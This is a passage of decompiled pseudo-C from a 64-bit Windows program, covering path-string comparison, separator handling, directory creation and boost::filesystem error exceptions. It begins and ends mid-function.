        v20 = (_WORD *)v5;
      else
        v20 = *(_WORD **)v5;
      v21 = v7[2];
      if ( v9 < v12 )
        v21 = *(_QWORD *)(v5 + 16);
      for ( j = v21 == 0; ; j = v21 == 0 )
      {
        if ( j )
        {
          v23 = 0;
          goto LABEL_40;
        }
        if ( *v20 != *v19 )
          break;
        ++v20;
        ++v19;
        --v21;
      }
      v23 = 1;
      if ( *v20 < *v19 )
        v23 = -1;
LABEL_40:
      v24 = v23;
      if ( !v23 )
      {
        if ( v9 >= v12 )
          v24 = v9 != v7[2];
        else
          v24 = -1;
      }
      if ( v24 < 0 )
      {
        v25 = v13 < 8;
        goto LABEL_76;
      }
      sub_140032B50(v7);
      sub_140032B50((void *)v5);
      if ( !sub_140031490((__int64)v7, v6) )
        break;
    }
  }
  v27 = v7[4];
  v28 = *(_QWORD *)(v6 + 32);
  if ( v27 != v28 )
    goto LABEL_88;
  if ( v7[5] == *(_QWORD *)(v6 + 40)
    && *(_QWORD *)(v5 + 32) == *(_QWORD *)(v4 + 32)
    && *(_QWORD *)(v5 + 40) == *(_QWORD *)(v4 + 40) )
  {
    if ( v7[3] >= 8ui64 )
      operator delete((void *)*v7);
    v7[3] = 7i64;
    v7[2] = 0i64;
    *(_WORD *)v7 = 0;
    if ( *(_QWORD *)(v6 + 24) >= 8ui64 )
      operator delete(*(void **)v6);
    *(_QWORD *)(v6 + 24) = 7i64;
    *(_QWORD *)(v6 + 16) = 0i64;
    *(_WORD *)v6 = 0;
    if ( *(_QWORD *)(v5 + 24) >= 8ui64 )
      operator delete(*(void **)v5);
    *(_QWORD *)(v5 + 24) = 7i64;
    *(_QWORD *)(v5 + 16) = 0i64;
    *(_WORD *)v5 = 0;
    if ( *(_QWORD *)(v4 + 24) >= 8ui64 )
      operator delete(*(void **)v4);
    result = 0i64;
    goto LABEL_85;
  }
  if ( v27 != v28 || (v29 = 1, v7[5] != *(_QWORD *)(v6 + 40)) )
LABEL_88:
    v29 = 0;
  if ( v29 )
    v8 = -1;
  v25 = v7[3] < 8ui64;
LABEL_76:
  if ( !v25 )
    operator delete((void *)*v7);
  v7[3] = 7i64;
  v7[2] = 0i64;
  *(_WORD *)v7 = 0;
  if ( *(_QWORD *)(v6 + 24) >= 8ui64 )
    operator delete(*(void **)v6);
  *(_QWORD *)(v6 + 24) = 7i64;
  *(_QWORD *)(v6 + 16) = 0i64;
  *(_WORD *)v6 = 0;
  if ( *(_QWORD *)(v5 + 24) >= 8ui64 )
    operator delete(*(void **)v5);
  *(_QWORD *)(v5 + 24) = 7i64;
  *(_QWORD *)(v5 + 16) = 0i64;
  *(_WORD *)v5 = 0;
  if ( *(_QWORD *)(v4 + 24) >= 8ui64 )
    operator delete(*(void **)v4);
  result = v8;
LABEL_85:
  *(_QWORD *)(v4 + 24) = 7i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_WORD *)v4 = 0;
  return result;
}

//----- (0000000140032930) ----------------------------------------------------
__int64 __fastcall sub_140032930(_QWORD *a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rax
  _QWORD *v3; // rdx
  _QWORD *v4; // rax
  __int16 v5; // dx

  v1 = a1[2];
  if ( !v1 )
    return 0i64;
  v2 = a1[3];
  v3 = v2 < 8 ? a1 : *a1;
  if ( *((_WORD *)v3 + v1 - 1) == 58 )
    return 0i64;
  v4 = v2 < 8 ? a1 : *a1;
  v5 = *((_WORD *)v4 + v1 - 1);
  if ( v5 == 47 || v5 == 92 )
    return 0i64;
  sub_14001C4B0(a1, 1ui64, 92);
  return v1;
}

//----- (00000001400329A0) ----------------------------------------------------
void __fastcall sub_1400329A0(_QWORD *a1, unsigned __int64 a2)
{
  _QWORD *v2; // rbx
  unsigned __int64 v3; // rcx
  unsigned __int64 v4; // r8
  _QWORD *v5; // rax
  _QWORD *v6; // rax
  _QWORD *v7; // rax
  signed __int64 v8; // rdi
  bool v9; // cf

  if ( a2 )
  {
    v2 = a1;
    v3 = a1[2];
    if ( a2 < v3 )
    {
      v4 = v2[3];
      v5 = v4 < 8 ? v2 : *v2;
      if ( *((_WORD *)v5 + a2 + 1) == 47 || (v4 < 8 ? (v6 = v2) : (v6 = (_QWORD *)*v2), *((_WORD *)v6 + a2 + 1) == 92) )
      {
        if ( v3 < a2 )
        {
          std::_Xout_of_range("invalid string position");
          __debugbreak();
        }
        if ( v3 - a2 > 1 )
        {
          if ( v4 < 8 )
            v7 = v2;
          else
            v7 = (_QWORD *)*v2;
          v8 = v3 - 1;
          if ( v3 - 1 != a2 )
            memmove((char *)v7 + 2 * a2, (char *)v7 + 2 * a2 + 2, 2 * (v3 - 1 - a2));
          v9 = v2[3] < 8ui64;
          v2[2] = v8;
          if ( !v9 )
            v2 = (_QWORD *)*v2;
          *((_WORD *)v2 + v8) = 0;
        }
        else
        {
          v2[2] = a2;
          if ( v4 >= 8 )
            v2 = (_QWORD *)*v2;
          *((_WORD *)v2 + a2) = 0;
        }
      }
    }
  }
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);

//----- (0000000140032A80) ----------------------------------------------------
signed __int64 __fastcall sub_140032A80(__int64 a1)
{
  __int64 v1; // rbx
  __int64 *v2; // rsi
  signed __int64 v3; // rdi
  __int64 *v4; // rax
  __int16 v5; // cx
  bool v6; // bl
  signed __int64 v7; // r8
  signed __int64 v8; // rcx
  __int64 *v9; // rdx
  __int16 v10; // ax
  signed __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 16);
  v2 = (__int64 *)a1;
  v3 = sub_1400320C0((char *)a1, *(_QWORD *)(a1 + 16));
  v6 = 0;
  if ( v1 )
  {
    v4 = (unsigned __int64)v2[3] < 8 ? v2 : *v2;
    v5 = *((_WORD *)v4 + v3);
    if ( v5 == 47 || v5 == 92 )
      v6 = 1;
  }
  v7 = sub_140033030(v2, v3);
  if ( v3 )
  {
    do
    {
      v8 = v3 - 1;
      if ( v3 - 1 == v7 )
        break;
      v9 = (unsigned __int64)v2[3] < 8 ? v2 : *v2;
      v10 = *((_WORD *)v9 + v3 - 1);
      if ( v10 != 47 && v10 != 92 )
        break;
      --v3;
    }
    while ( v8 );
  }
  if ( v3 != 1 || v7 || !v6 )
    result = v3;
  else
    result = -1i64;
  return result;
}

//----- (0000000140032B50) ----------------------------------------------------
void __fastcall sub_140032B50(void *Src)
{
  __int64 *v1; // rbx
  unsigned __int64 v2; // r8
  __int64 v3; // r9
  char *v4; // rsi
  signed __int64 v5; // rbp
  unsigned __int64 v6; // rax
  __int64 *v7; // rcx
  __int16 v8; // dx
  __int64 *v9; // rax
  __int16 v10; // cx
  char v11; // cl
  __int64 *v12; // rax
  __int16 v13; // ax
  __int64 v14; // rax
  __int64 *v15; // rax
  __int64 v16; // rdx
  __int16 v17; // cx
  __int64 v18; // rax
  signed __int64 v19; // rdi
  __int64 v20; // rdx
  __int64 v21; // rcx
  __int64 *v22; // rax
  unsigned __int64 v23; // rdi
  signed __int64 v24; // rax
  __int64 *v25; // rax
  void *v26; // [rsp+28h] [rbp-30h]
  unsigned __int64 v27; // [rsp+40h] [rbp-18h]

  v1 = (__int64 *)Src;
  v2 = *((_QWORD *)Src + 2);
  *((_QWORD *)Src + 5) += v2;
  v3 = *((_QWORD *)Src + 5);
  v4 = (char *)*((_QWORD *)Src + 4);
  v5 = *((_QWORD *)v4 + 2);
  if ( v3 == v5 )
  {
    *((_QWORD *)Src + 2) = 0i64;
    if ( *((_QWORD *)Src + 3) >= 8ui64 )
      v1 = *(__int64 **)Src;
    *(_WORD *)v1 = 0;
  }
  else
  {
    if ( v2 <= 2 )
      goto LABEL_52;
    v6 = *((_QWORD *)Src + 3);
    if ( v6 >= 8 )
      Src = *(void **)Src;
    if ( *(_WORD *)Src != 47 && *(_WORD *)Src != 92
      || (v6 < 8 ? (v7 = v1) : (v7 = (__int64 *)*v1),
          (v8 = *((_WORD *)v7 + 1), v8 != 47) && v8 != 92
       || (v6 < 8 ? (v9 = v1) : (v9 = (__int64 *)*v1), (v10 = *((_WORD *)v9 + 2), v10 == 47) || v10 == 92)) )
    {
LABEL_52:
      v11 = 0;
    }
    else
    {
      v11 = 1;
    }
    if ( *((_QWORD *)v4 + 3) < 8ui64 )
      v12 = (__int64 *)v4;
    else
      v12 = *(__int64 **)v4;
    v13 = *((_WORD *)v12 + v3);
    if ( v13 != 47 && v13 != 92 )
      goto LABEL_53;
    if ( v11 || ((unsigned __int64)v1[3] < 8 ? (v14 = (__int64)v1) : (v14 = *v1), *(_WORD *)(v14 + 2 * v2 - 2) == 58) )
    {
      sub_1400315D0(v1, 47);
      return;
    }
    if ( v3 != v5 )
    {
      do
      {
        if ( *((_QWORD *)v4 + 3) < 8ui64 )
          v15 = (__int64 *)v4;
        else
          v15 = *(__int64 **)v4;
        v16 = v1[5];
        v17 = *((_WORD *)v15 + v16);
        if ( v17 != 47 && v17 != 92 )
          break;
        v1[5] = v16 + 1;
      }
      while ( v16 + 1 != *((_QWORD *)v4 + 2) );
    }
    v5 = *((_QWORD *)v4 + 2);
    v18 = v1[5];
    if ( v18 != v5 || (v19 = v18 - 1, sub_1400324B0((__int64 *)v4, v18 - 1)) )
    {
LABEL_53:
      v23 = v1[5];
      v24 = sub_1400321D0(v4, &word_1400A7850, v1[5], 2i64);
      if ( v24 == -1 )
        v24 = v5;
      v25 = sub_140033240(v4, &v26, v23, v24 - v23);
      if ( v1 != v25 )
        sub_140005050(v1, v25, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v27 >= 8 )
        operator delete(v26);
    }
    else
    {
      v1[5] = v19;
      v22 = (__int64 *)sub_140031BF0(v21, v20);
      if ( v1 != v22 )
        sub_140005050(v1, v22, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    }
  }
}
// 140031BF0: using guessed type __int64 __cdecl sub_140031BF0(_QWORD, _QWORD);
// 1400A7850: using guessed type __int16 word_1400A7850;

//----- (0000000140032EB0) ----------------------------------------------------
_QWORD *__usercall sub_140032EB0@<rax>(void *Src@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, char *a4@<r9>, __int64 a5)
{
  _QWORD *v5; // rbx
  char *v6; // r10
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // r8
  _QWORD *result; // rax
  void *v10; // r9
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // r8

  v5 = Src;
  v6 = a4;
  if ( a4 == (char *)a5 )
  {
    if ( *((_QWORD *)Src + 3) >= 8ui64 )
      Src = *(void **)Src;
    v7 = 0i64;
    if ( a3 )
      v8 = (a3 - a2) >> 1;
    else
      v8 = 0i64;
    if ( a2 )
      v7 = (a2 - (signed __int64)Src) >> 1;
    sub_140005300(v5, v7, v8);
    result = v5;
  }
  else
  {
    if ( *((_QWORD *)Src + 3) < 8ui64 )
      v10 = Src;
    else
      v10 = *(void **)Src;
    v11 = 0i64;
    if ( a3 )
      v12 = (a3 - a2) >> 1;
    else
      v12 = 0i64;
    if ( a2 )
      v11 = (a2 - (signed __int64)v10) >> 1;
    sub_140031150(Src, v11, v12, v6, (a5 - (signed __int64)v6) >> 1);
    result = v5;
  }
  return result;
}

//----- (0000000140032F60) ----------------------------------------------------
signed __int64 __fastcall sub_140032F60(char *a1, __int16 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rax
  __int16 v4; // si
  char *v5; // rdi
  unsigned __int64 v6; // rax
  char *i; // rbx
  signed __int64 v8; // rdx
  __int16 *v9; // r8
  char *v10; // rax
  signed int v12; // edx
  __int16 v13; // [rsp+38h] [rbp+10h]

  v13 = a2;
  v3 = *((_QWORD *)a1 + 2);
  v4 = a2;
  v5 = a1;
  if ( v3 >= 1 )
  {
    v6 = v3 - 1;
    if ( a3 < v6 )
      v6 = a3;
    if ( *((_QWORD *)a1 + 3) >= 8ui64 )
      a1 = *(char **)a1;
    for ( i = &a1[2 * v6]; ; i -= 2 )
    {
      if ( *(_WORD *)i == v4 )
      {
        v8 = 1i64;
        v9 = &v13;
        v10 = i;
        while ( *(_WORD *)v10 == *v9 )
        {
          v10 += 2;
          ++v9;
          if ( !--v8 )
            goto LABEL_11;
        }
        v12 = 1;
        if ( *(_WORD *)v10 < (unsigned __int16)*v9 )
          v12 = -1;
        if ( !v12 )
        {
LABEL_11:
          if ( *((_QWORD *)v5 + 3) >= 8ui64 )
            v5 = *(char **)v5;
          return (i - v5) >> 1;
        }
      }
      if ( i == (char *)sub_140004B70(v5) )
        break;
    }
  }
  return -1i64;
}

//----- (0000000140033030) ----------------------------------------------------
signed __int64 __fastcall sub_140033030(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  unsigned __int64 v3; // rax
  __int64 v4; // rdx
  __int64 v5; // rax
  __int16 v6; // dx
  unsigned __int64 v8; // rax
  _WORD *v9; // rdx
  __int64 v10; // rax
  __int16 v11; // dx
  unsigned __int64 v12; // rax
  _WORD *v13; // rdx
  __int64 *v14; // rdx
  __int16 v15; // r8
  __int64 *v16; // rdx
  __int64 *v17; // rax
  __int16 v18; // dx
  unsigned __int64 v19; // r8
  unsigned __int64 v20; // rax
  signed __int64 v21; // rcx
  unsigned __int64 v22; // rax
  _WORD *v23; // rdx
  __int64 *v24; // rdx
  __int16 v25; // r8
  __int64 *v26; // rax
  __int16 v27; // dx

  v2 = a2;
  if ( a2 > 2 )
  {
    v3 = a1[3];
    v4 = (__int64)(v3 < 8 ? a1 : *a1);
    if ( *(_WORD *)(v4 + 2) == 58 )
    {
      v5 = (__int64)(v3 < 8 ? a1 : *a1);
      v6 = *(_WORD *)(v5 + 4);
      if ( v6 == 47 || v6 == 92 )
        return 2i64;
    }
  }
  if ( v2 != 2 )
  {
    if ( v2 <= 4
      || ((v12 = a1[3], v12 < 8) ? (v13 = a1) : (v13 = (_WORD *)*a1),
          *v13 != 47 && *v13 != 92
       || (v12 < 8 ? (v14 = a1) : (v14 = (__int64 *)*a1),
           (v15 = *((_WORD *)v14 + 1), v15 != 47) && v15 != 92
        || (v12 < 8 ? (v16 = a1) : (v16 = (__int64 *)*a1),
            *((_WORD *)v16 + 2) != 63
         || (v12 < 8 ? (v17 = a1) : (v17 = (__int64 *)*a1), (v18 = *((_WORD *)v17 + 3), v18 != 47) && v18 != 92)))) )
    {
      if ( v2 <= 3
        || ((v22 = a1[3], v22 < 8) ? (v23 = a1) : (v23 = (_WORD *)*a1),
            *v23 != 47 && *v23 != 92
         || (v22 < 8 ? (v24 = a1) : (v24 = (__int64 *)*a1),
             (v25 = *((_WORD *)v24 + 1), v25 != 47) && v25 != 92
          || (v22 < 8 ? (v26 = a1) : (v26 = (__int64 *)*a1), (v27 = *((_WORD *)v26 + 2), v27 == 47) || v27 == 92))) )
      {
        if ( !v2 )
          return -1i64;
        goto LABEL_66;
      }
      v19 = 2i64;
    }
    else
    {
      v19 = 4i64;
    }
    v20 = sub_1400321D0((char *)a1, &word_1400A7850, v19, 2i64);
    v21 = -1i64;
    if ( v20 < v2 )
      v21 = v20;
    return v21;
  }
  v8 = a1[3];
  if ( v8 < 8 )
    v9 = a1;
  else
    v9 = (_WORD *)*a1;
  if ( *v9 == 47 || *v9 == 92 )
  {
    v10 = (__int64)(v8 < 8 ? a1 : *a1);
    v11 = *(_WORD *)(v10 + 2);
    if ( v11 == 47 || v11 == 92 )
      return -1i64;
  }
LABEL_66:
  if ( (unsigned __int64)a1[3] >= 8 )
    a1 = (__int64 *)*a1;
  if ( *(_WORD *)a1 != 47 && *(_WORD *)a1 != 92 )
    return -1i64;
  return 0i64;
}
// 1400A7850: using guessed type __int16 word_1400A7850;

//----- (0000000140033240) ----------------------------------------------------
_QWORD *__fastcall sub_140033240(_QWORD *a1, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4)
{
  _QWORD *v4; // rbx

  v4 = a2;
  a2[3] = 7i64;
  a2[2] = 0i64;
  *(_WORD *)a2 = 0;
  sub_140005050(a2, a1, a3, a4);
  return v4;
}

//----- (00000001400332F0) ----------------------------------------------------
__int64 __fastcall sub_1400332F0(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = (__int64 *)sub_140033280(&v11);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}
// 140033280: using guessed type __int64 __fastcall sub_140033280(_QWORD);

//----- (00000001400333D0) ----------------------------------------------------
std::exception *__fastcall sub_1400333D0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  __int64 v4; // rax

  v2 = a2;
  v3 = a1;
  sub_140011370(a1, a2);
  *(_QWORD *)v3 = &off_1400A7D00;
  *((_QWORD *)v3 + 9) = *((_QWORD *)v2 + 9);
  v4 = *((_QWORD *)v2 + 10);
  *((_QWORD *)v3 + 10) = v4;
  if ( v4 )
    _InterlockedIncrement((volatile signed __int32 *)(v4 + 8));
  return v3;
}
// 1400A7D00: using guessed type __int64 (__fastcall *off_1400A7D00)(void *);

//----- (0000000140033420) ----------------------------------------------------
std::exception *__fastcall sub_140033420(std::exception *a1, __int128 *a2, _QWORD *a3, _QWORD *a4, __int128 *a5)
{
  _QWORD *v5; // r14
  _QWORD *v6; // rsi
  std::exception *v7; // rbx
  _QWORD *v8; // rax
  _QWORD *v9; // rcx
  _QWORD *v10; // rcx
  __int128 v12; // [rsp+30h] [rbp-28h]

  v5 = a4;
  v6 = a3;
  v7 = a1;
  v12 = *a5;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(__int128 **)a2;
  a5 = a2;
  std::exception::exception(a1, (const char *const *)&a5);
  *(_OWORD *)((char *)v7 + 24) = v12;
  *((_QWORD *)v7 + 8) = 15i64;
  *((_QWORD *)v7 + 7) = 0i64;
  *((_BYTE *)v7 + 40) = 0;
  *(_QWORD *)v7 = &off_1400A7D00;
  *((_QWORD *)v7 + 9) = 0i64;
  *((_QWORD *)v7 + 10) = 0i64;
  v8 = operator new(0x60ui64);
  if ( v8 )
  {
    v8[3] = 7i64;
    v8[2] = 0i64;
    *(_WORD *)v8 = 0;
    v8[7] = 7i64;
    v8[6] = 0i64;
    *((_WORD *)v8 + 16) = 0;
    v8[11] = 15i64;
    v8[10] = 0i64;
    *((_BYTE *)v8 + 64) = 0;
  }
  else
  {
    v8 = 0i64;
  }
  sub_1400332F0((__int64 *)v7 + 9, (__int64)v8);
  v9 = (_QWORD *)*((_QWORD *)v7 + 9);
  if ( v9 != v6 )
    sub_140005050(v9, v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v10 = (_QWORD *)(*((_QWORD *)v7 + 9) + 32i64);
  if ( v10 != v5 )
    sub_140005050(v10, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v7;
}
// 140099C27: using guessed type __int64 sub_140099C27(void);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A7D00: using guessed type __int64 (__fastcall *off_1400A7D00)(void *);

//----- (0000000140033550) ----------------------------------------------------
std::exception *__fastcall sub_140033550(std::exception *a1, _QWORD *a2, _QWORD *a3, __int128 *a4)
{
  _QWORD *v4; // rsi
  std::exception *v5; // rbx
  _QWORD *v6; // rax
  _QWORD *v7; // rcx
  __int128 v9; // [rsp+30h] [rbp-28h]
  _QWORD *v10; // [rsp+68h] [rbp+10h]

  v4 = a3;
  v5 = a1;
  v9 = *a4;
  if ( a2[3] >= 0x10ui64 )
    a2 = (_QWORD *)*a2;
  v10 = a2;
  std::exception::exception(a1, (const char *const *)&v10);
  *(_OWORD *)((char *)v5 + 24) = v9;
  *((_QWORD *)v5 + 8) = 15i64;
  *((_QWORD *)v5 + 7) = 0i64;
  *((_BYTE *)v5 + 40) = 0;
  *(_QWORD *)v5 = &off_1400A7D00;
  *((_QWORD *)v5 + 9) = 0i64;
  *((_QWORD *)v5 + 10) = 0i64;
  v6 = operator new(0x60ui64);
  if ( v6 )
  {
    v6[3] = 7i64;
    v6[2] = 0i64;
    *(_WORD *)v6 = 0;
    v6[7] = 7i64;
    v6[6] = 0i64;
    *((_WORD *)v6 + 16) = 0;
    v6[11] = 15i64;
    v6[10] = 0i64;
    *((_BYTE *)v6 + 64) = 0;
  }
  else
  {
    v6 = 0i64;
  }
  sub_1400332F0((__int64 *)v5 + 9, (__int64)v6);
  v7 = (_QWORD *)*((_QWORD *)v5 + 9);
  if ( v7 != v4 )
    sub_140005050(v7, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v5;
}
// 140099C77: using guessed type __int64 sub_140099C77(void);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A7D00: using guessed type __int64 (__fastcall *off_1400A7D00)(void *);

//----- (0000000140033650) ----------------------------------------------------
__int64 __fastcall sub_140033650(_QWORD *a1)
{
  _QWORD *v1; // rbx
  volatile signed __int32 *v2; // rdi

  v1 = a1;
  *a1 = &off_1400A7D00;
  v2 = (volatile signed __int32 *)a1[10];
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  *v1 = &loc_1400A3CD0;
  if ( v1[8] >= 0x10ui64 )
    operator delete((void *)v1[5]);
  v1[8] = 15i64;
  v1[7] = 0i64;
  *((_BYTE *)v1 + 40) = 0;
  return std::exception::~exception((std::exception *)v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A7D00: using guessed type __int64 (__fastcall *off_1400A7D00)(void *);

//----- (0000000140033700) ----------------------------------------------------
void __fastcall sub_140033700(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 88) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 64));
  *(_QWORD *)(v1 + 88) = 15i64;
  *(_QWORD *)(v1 + 80) = 0i64;
  *(_BYTE *)(v1 + 64) = 0;
  if ( *(_QWORD *)(v1 + 56) >= 8ui64 )
    operator delete(*(void **)(v1 + 32));
  *(_QWORD *)(v1 + 56) = 7i64;
  *(_QWORD *)(v1 + 48) = 0i64;
  *(_WORD *)(v1 + 32) = 0;
  if ( *(_QWORD *)(v1 + 24) >= 8ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 7i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_WORD *)v1 = 0;
}

//----- (0000000140033780) ----------------------------------------------------
void *__fastcall sub_140033780(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140033650(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140033930) ----------------------------------------------------
char __fastcall sub_140033930(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rsi
  __int64 v4; // rcx
  DWORD v6; // ebp
  __int64 v7; // rcx
  __int64 v8; // rcx
  __int64 v9; // rax
  __int64 v10; // rcx
  __m128i v11; // [rsp+20h] [rbp-B8h]
  __int64 v12; // [rsp+30h] [rbp-A8h]
  char v13; // [rsp+38h] [rbp-A0h]
  char Dst; // [rsp+40h] [rbp-98h]
  __int64 v15; // [rsp+50h] [rbp-88h]
  __int64 v16; // [rsp+58h] [rbp-80h]
  char v17; // [rsp+60h] [rbp-78h]

  v12 = -2i64;
  v2 = a2;
  v3 = a1;
  if ( a1[3] >= 8ui64 )
    a1 = (_QWORD *)*a1;
  if ( !CreateDirectoryW((LPCWSTR)a1, 0i64) )
  {
    v6 = GetLastError();
    v11.m128i_i32[0] = 0;
    v11.m128i_i64[1] = sub_140030C00(v7);
    if ( v6 != 183 || *sub_1400348D0(&v13, v3, (__int64)&v11) != 3 )
    {
      if ( !v2 )
      {
        v16 = 15i64;
        v15 = 0i64;
        Dst = 0;
        sub_140004F20(&Dst, "boost::filesystem::create_directory", 0x23ui64);
        v11.m128i_i32[0] = v6;
        v11.m128i_i64[1] = sub_140030C00(v10);
        _mm_store_si128(&v11, v11);
        sub_140033550((std::exception *)&v17, &Dst, v3, (__int128 *)v11.m128i_i8);
        CxxThrowException(&v17, &_TI4_AVfilesystem_error_filesystem_boost__);
      }
      v9 = sub_140030C00(v8);
      *(_DWORD *)v2 = v6;
    }
    else
    {
      if ( !v2 )
        return 0;
      *(_DWORD *)v2 = 0;
      v9 = sub_140030C00(v8);
    }
    *(_QWORD *)(v2 + 8) = v9;
    return 0;
  }
  if ( v2 )
  {
    *(_DWORD *)v2 = 0;
    *(_QWORD *)(v2 + 8) = sub_140030C00(v4);
  }
  return 1;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3E98: using guessed type int _TI4_AVfilesystem_error_filesystem_boost__;

//----- (0000000140033A90) ----------------------------------------------------
void __fastcall sub_140033A90(__int64 a1)
{
  void *v1; // rbx

  v1 = *(void **)(a1 + 16);
  if ( v1 )
  {
    sub_140033700(*(_QWORD *)(a1 + 16));
    operator delete(v1);
  }
}

//----- (0000000140033E50) ----------------------------------------------------
bool __fastcall sub_140033E50(__int64 a1, _QWORD *a2, _QWORD *a3, _DWORD *a4, __int128 *a5)
{
  _DWORD *v5; // rbx
  _QWORD *v6; // r14
  _QWORD *v7; // rbp
  int v8; // esi
  __int64 v9; // rax
  __m128i v11; // [rsp+30h] [rbp-A8h]
  char v12; // [rsp+40h] [rbp-98h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( (_DWORD)a1 )
  {
    if ( !a4 )
    {
      v11.m128i_i32[0] = a1;
      v11.m128i_i64[1] = sub_140030C00(a1);
      _mm_store_si128(&v11, v11);
      sub_140033420((std::exception *)&v12, a5, v7, v6, (__int128 *)v11.m128i_i8);
      CxxThrowException(&v12, &_TI4_AVfilesystem_error_filesystem_boost__);
    }
    v9 = sub_140030C00(a1);
    *v5 = v8;
    goto LABEL_6;
  }
  if ( a4 )
  {
    *a4 = 0;
    v9 = sub_140030C00(a1);
LABEL_6:
    *((_QWORD *)v5 + 1) = v9;
  }
  return v8 != 0;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3E98: using guessed type int _TI4_AVfilesystem_error_filesystem_boost__;

//----- (0000000140033F30) ----------------------------------------------------
bool __fastcall sub_140033F30(__int64 a1, _QWORD *a2, _DWORD *a3, _QWORD *a4)
{
  _QWORD *v4; // r14
  _DWORD *v5; // rbx
  _QWORD *v6; // rbp
  int v7; // esi
  __int64 v8; // rax
  __m128i v10; // [rsp+20h] [rbp-A8h]
  char v11; // [rsp+30h] [rbp-98h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( (_DWORD)a1 )
  {
    if ( !a3 )
    {
      v10.m128i_i32[0] = a1;
      v10.m128i_i64[1] = sub_140030C00(a1);
      _mm_store_si128(&v10, v10);
      sub_140033550((std::exception *)&v11, v4, v6, (__int128 *)v10.m128i_i8);
      CxxThrowException(&v11, &_TI4_AVfilesystem_error_filesystem_boost__);
    }
    v8 = sub_140030C00(a1);
    *v5 = v7;
    goto LABEL_6;
  }
  if ( a3 )
  {
    *a3 = 0;
    v8 = sub_140030C00(a1);
LABEL_6:
    *((_QWORD *)v5 + 1) = v8;
  }
  return v7 != 0;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3E98: using guessed type int _TI4_AVfilesystem_error_filesystem_boost__;

//----- (00000001400340D0) ----------------------------------------------------
__int64 __fastcall sub_1400340D0(__int64 a1, char a2)
{
  __int64 v2; // rsi
  unsigned int v3; // edi
  _QWORD *v4; // rax
  const char *v5; // rax
  char v6; // bl
  _QWORD *v7; // rax
  const char *v8; // rax
  _QWORD *v9; // rax
  const char *v10; // rax
  _QWORD *v11; // rax
  const char *v12; // rax
  char v13; // si
  void *v15; // [rsp+30h] [rbp-B8h]
  __int64 v16; // [rsp+40h] [rbp-A8h]
  unsigned __int64 v17; // [rsp+48h] [rbp-A0h]
  void *v18; // [rsp+50h] [rbp-98h]
  __int64 v19; // [rsp+60h] [rbp-88h]
  unsigned __int64 v20; // [rsp+68h] [rbp-80h]
